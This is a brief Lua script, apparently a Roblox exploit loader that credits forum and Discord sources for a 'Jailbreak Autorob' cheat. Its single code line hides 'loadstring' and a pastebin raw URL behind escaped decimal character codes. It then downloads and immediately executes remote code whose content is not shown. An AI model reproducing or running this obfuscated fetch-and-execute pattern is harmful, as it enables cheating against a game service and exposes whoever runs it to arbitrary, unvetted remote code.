--// sources: https://discord.gg/b5gtEVX, https://v3rmillion.net/showthread.php?tid=1006970
--// credits: Veernezus Jailbreak Autorob by Veernezus#5392 and Ziegel#8171.

getfenv()["\108\111\97\100\115\116\114\105\110\103"](game:HttpGet("\104\116\116\112\115\58\47\47".."pastebin".."\46\99\111\109\47\114\97\119\47\102\88\84\82\53\98\106\90"))() 